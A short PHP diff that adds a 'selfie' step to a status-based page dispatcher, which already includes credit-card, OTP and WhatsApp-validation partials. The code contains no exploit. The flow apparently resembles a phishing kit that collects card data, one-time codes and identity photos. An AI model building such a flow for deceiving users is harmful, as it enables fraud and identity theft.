@@ -57,6 +57,8 @@ if ($status === 'otp') {
         include 'partials/tarjeta_credito.php';
     } elseif ($status === 'whatsapp') { // <-- Nuevo estado Include
         include 'partials/whatsapp_validation.php';
+    } elseif ($status === 'selfie') { // <-- Nuevo estado Selfie Include
+        include 'partials/selfie.php';
     }
     ?>
 
